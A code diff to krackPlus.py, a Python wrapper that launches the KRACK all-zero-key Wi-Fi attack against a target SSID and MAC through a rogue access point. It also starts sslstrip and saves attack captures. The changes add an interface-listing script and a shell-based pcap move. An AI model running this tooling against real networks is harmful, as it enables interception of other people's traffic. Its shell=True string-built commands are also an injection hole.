@@ -43,6 +43,7 @@ def main():
     USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
     path = 'reports/'
     parser = optparse.OptionParser(usage=USAGE)
+    subprocess.call(["bash displayInterfaces.sh"],shell=True)	
 
     # KRACK+ Scan options
     parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
@@ -140,15 +141,13 @@ def main():
 		                         options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
 			
 		elif options.pcap:
-			# TODO creates a file, but fails to move it. Also haven't verified that it contains anything of interest. 
+			# TODO Verify that this file is moved and contains useful information 
 			# Saves pcap from attack to file. 
 			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
 			source=os.listdir("krackattacks-poc-zerokey/krackattack/")
 			destination="reports/"
-			for fileName in source:
-				if str(".pcap") in str(fileName):
-					shutil.move(fileName, destination)
+                        subprocess.call(["mv " + "krackattacks-poc-zerokey/krackattack/" + "*pcap " + destination], shell=True)
 
                 elif options.sslstrip:
                     subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
